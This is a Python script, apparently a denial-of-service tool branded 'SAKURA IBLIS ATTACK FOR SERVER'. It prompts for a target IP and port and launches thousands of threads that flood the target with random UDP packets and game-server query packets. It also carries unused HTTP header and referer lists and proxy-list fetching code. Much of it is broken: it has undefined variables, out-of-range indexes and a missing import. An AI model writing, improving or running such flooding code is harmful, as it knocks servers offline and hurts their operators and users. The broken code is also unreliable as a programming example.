import socket, struct, codecs, sys, threading, random, time, os



Pacotes = [

 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),

 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),

 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),

 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),

 codecs.decode('081e62da', 'hex_codec'),

 codecs.decode('081e77da', 'hex_codec'),

 codecs.decode('081e4dda', 'hex_codec'),

 codecs.decode('021efd40', 'hex_codec'),

 codecs.decode('081e7eda', 'hex_codec')]

 

acceptall = [

		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",

		"Accept-Encoding: gzip, deflate\r\n",

		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",

		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",

		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",

		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",

		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",

		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",

		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"

		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",

		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",

		"Accept: text/html, application/xhtml+xml",

		"Accept-Language: en-US,en;q=0.5\r\n",

		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",

		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]



referers = [

	"https://www.google.com/search?q=",

	"https://check-host.net/",

	"https://www.facebook.com/",

	"https://www.youtube.com/",

	"https://www.fbi.com/",

	"https://www.bing.com/search?q=",

	"https://r.search.yahoo.com/",

	"https://www.cia.gov/index.html",

	"https://vk.com/profile.php?redirect=",

	"https://www.usatoday.com/search/results?q=",

	"https://help.baidu.com/searchResult?keywords=",

	"https://steamcommunity.com/market/search?q=",

	"https://www.ted.com/search?q=",

	"https://play.google.com/store/search?q=",

	"https://www.qwant.com/search?q=",

	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",

	"https://www.google.ad/search?q=",

	"https://www.google.ae/search?q=",

	"https://www.google.com.af/search?q=",

	"https://www.google.com.ag/search?q=",

	"https://www.google.com.ai/search?q=",

	"https://www.google.al/search?q=",

	"https://www.google.am/search?q=",

	"https://www.google.co.ao/search?q=",

     ]

     

os.system("clear")

print ("\033[32m                     ╔════════════════════════════════════╗")

print ("\033[32m                     ║\033[93m  ╔═╗╔═╗╦╔═╦ ╦╦═╗╔═╗\033[32m  ╦╔╗ ╦  ╦╔═╗\033[32m   ║")

print ("\033[32m                     ║\033[93m  ╚═╗╠═╣╠╩╗║ ║╠╦╝╠═╣\033[32m  ║╠╩╗║  ║╚═╗\033[32m   ║")

print ("\033[32m                     ║\033[93m  ╚═╝╩ ╩╩ ╩╚═╝╩╚═╩ ╩\033[32m  ╩╚═╝╩═╝╩╚═╝ \033[32m  ║")

print ("\033[32m                     ╚════════════════════════════════════╝")

print ("\033[32m                       ║\033[93m SAKURA IBLIS ATTACK FOR SERVER \033[32m║") 

print ("\033[32m                      ╔════════════════════════════════════╗")

print ("\033[32m                      ║\033[93m    TOOLS BY    \033[32m║\033[93m    CREATED TOOLS \033[32m   ║")  

print ("\033[32m                      ║ ══════════════════════════════════ ║") 

print ("\033[32m                      ║\033[93m      ZXZ       \033[32m║\033[93m     08/8/2022    \033[32m   ║")  

print ("\033[32m                      ╚════════════════════════════════════╝")

ip = str(input("                           \033[93m IP TARGET \033[32m║\033[93m \033[393m"))           

port = int(input("                     \033[93m    PORT TARGET \033[32m║\033[93m \033[93m"))



def randomip():

  randip = []

  randip1 = random.randint(0, 255)

  randip2 = random.randint(0, 255)

  randip3 = random.randint(1, 254)

  randip4 = random.randint(1, 256)

  randip5 = random.randint(2, 254)

  randip6 = random.randint(2, 256)

  randip6 = random.randint(3, 259)

  

  randip.append(randip1)

  randip.append(randip2)

  randip.append(randip3)

  randip.append(randip4)

  randip.append(randip5)

  randip.append(randip6)

  randip.append(randip7)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5]) + "." + str(randip[6]) + "." + str(randip[7])

  return(randip)



def spoofer():

    addr = [192, 168, 0, 1]

    d = '.'

    addr[0] = str(random.randrange(11, 197))

    addr[1] = str(random.randrange(0, 255))

    addr[2] = str(random.randrange(0, 255))

    addr[3] = str(random.randrange(2, 254))

    addr[4] = str(random.randrange(2, 256))

    addr[5] = str(random.randrange(2, 254))

    addr[6] = str(random.randrange(3, 256))

    addr[7] = str(random.randrange(3, 259))

    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6] + d + addr[7]

    return assemebled



def getproxy():

    global proxies

    f = open(f'{nprox}.txt','wb')

    r = requests.get(urlproxy)

    f.write(r.content)

    f.close()

    proxies = open(f'{nprox}.txt').readlines()



def proxyask():

    global urlproxy

    pro = input(f'[~] Get New List {nprox} [Y] : ')

    if pro == "Y":

        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks4"

        urlproxy = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true"

        getproxy()

        askthreads()

    else:

        proxyask()  



class MyThread(threading.Thread):



    def run(self):

        while True:

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            bytes = random._urandom(1041)

            pack = random._urandom(577)

            msg = Pacotes[random.randrange(0,5)]

            sock.sendto(bytes, (ip, int(port)))

            sock.sendto(pack, (ip, int(port)))

            sock.sendto(msg, (ip, int(port)))

            if int(port) == 7777:

                sock.sendto(Pacotes[5], (ip, int(port)))

            elif int(port) == 7796:

                sock.sendto(Pacotes[4], (ip, int(port)))

            elif int(port) == 7771:

                sock.sendto(Pacotes[6], (ip, int(port)))

            elif int(port) == 7784:

                sock.sendto(Pacotes[7], (ip, int(port)))

            elif int(port) == 7785:

                sock.sendto(Pacotes[8], (ip, int(port)))

            elif int(port) == 7776:

                sock.sendto(Pacotes[3], (ip, int(port)))    

            elif int(port) == 7738:

                sock.sendto(Pacotes[9], (ip, int(port)))    

  

if __name__ == '__main__':

    try:

        for x in range(30000):

            mythread = MyThread()

            mythread.start()

            time.sleep(.1)



    except KeyboardInterrupt:

        os.system('cls' if os.name == 'nt' else 'clear')

        print ("╔════════════════════════════════════╗")

        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")

        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")

        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")

        print ("╚════════════════════════════════════╝")

        print ('\n\n')

        print ('STOP TO ATTACK {}').format(orgip)

